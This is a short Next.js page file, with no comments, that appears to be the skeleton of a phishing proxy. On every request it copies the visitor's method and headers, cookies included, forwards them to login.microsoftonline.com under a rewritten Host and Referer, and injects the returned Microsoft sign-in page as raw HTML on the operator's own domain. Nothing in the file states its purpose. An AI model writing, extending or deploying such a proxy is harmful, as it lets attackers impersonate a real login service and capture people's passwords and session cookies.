export async function getServerSideProps(context) {
    const upstream = 'login.microsoftonline.com';
    const upstream_path = '/';
    const https = true;

    const url = new URL('/', `http://${context.req.headers.host}`);
    url.host = upstream;
    url.protocol = https ? 'https:' : 'http:';
    url.pathname = upstream_path;

    const fetchOptions = {
        method: context.req.method,
        headers: { ...context.req.headers, Host: upstream, Referer: `${url.protocol}//${context.req.headers.host}` }
    };

    const response = await fetch(url.href, fetchOptions);
    const text = await response.text();

    return {
        props: {
            content: text
        }
    };
}

export default function Home({ content }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: content }} />
    );
}
